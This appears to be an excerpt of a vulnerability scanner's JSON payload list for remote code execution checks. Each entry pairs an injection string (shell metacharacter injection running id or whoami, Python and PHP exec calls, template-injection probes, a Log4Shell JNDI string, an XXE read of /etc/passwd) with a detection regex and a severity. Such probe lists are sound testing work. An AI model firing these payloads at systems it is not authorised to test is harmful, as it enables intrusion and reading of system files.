{
  "rce_payloads": [
    {
      "name": "Basic Unix command injection (semicolon)",
      "payload": ";id",
      "pattern": "uid=\\d+.*gid=\\d+",
      "severity": "CRITICAL"
    },
    {
      "name": "Unix command injection (pipe)",
      "payload": "|id",
      "pattern": "uid=\\d+.*gid=\\d+",
      "severity": "CRITICAL"
    },
    {
      "name": "Unix command injection (backtick)",
      "payload": "`id`",
      "pattern": "uid=\\d+.*gid=\\d+",
      "severity": "CRITICAL"
    },
    {
      "name": "Unix command injection (dollar-paren)",
      "payload": "$(id)",
      "pattern": "uid=\\d+.*gid=\\d+",
      "severity": "CRITICAL"
    },
    {
      "name": "Windows command injection (ampersand)",
      "payload": "&whoami",
      "pattern": "\\bnt authority\\\\(system|local service|network service)\\b|\\b[a-z0-9_.$-]{2,32}\\\\(administrator|[a-z0-9_.$-]{2,32})\\b",
      "severity": "CRITICAL"
    },
    {
      "name": "Python eval probe",
      "payload": "__import__('os').system('id')",
      "pattern": "uid=\\d+.*gid=\\d+",
      "severity": "CRITICAL"
    },
    {
      "name": "PHP exec probe",
      "payload": "<?php system('id'); ?>",
      "pattern": "uid=\\d+.*gid=\\d+",
      "severity": "CRITICAL"
    },
    {
      "name": "SSTI Jinja2/Twig basic probe",
      "payload": "{{7*7}}",
      "pattern": "\\b49\\b",
      "severity": "HIGH"
    },
    {
      "name": "SSTI Jinja2 config object leak",
      "payload": "{{config}}",
      "pattern": "<Config",
      "severity": "HIGH"
    },
    {
      "name": "SSTI Freemarker probe",
      "payload": "${7*7}",
      "pattern": "\\b49\\b",
      "severity": "HIGH"
    },
    {
      "name": "Log4Shell JNDI probe (in-band, low confidence)",
      "payload": "${jndi:ldap://127.0.0.1/a}",
      "pattern": "uid=\\d+.*gid=\\d+",
      "severity": "INFO",
      "requires_oob_confirmation": true,
      "note": "Log4Shell is a blind/asynchronous vulnerability: the JNDI lookup happens when a logger processes the string, not synchronously in the HTTP response body. A body-content match here CANNOT confirm exploitation. Treat any hit as a lead only, and confirm with an out-of-band collaborator (DNS/LDAP listener you control) before reporting CRITICAL."
    },
    {
      "name": "XInclude / XXE probe",
      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
      "pattern": "root:x:|nobody:",
      "severity": "CRITICAL"
    }
  ],
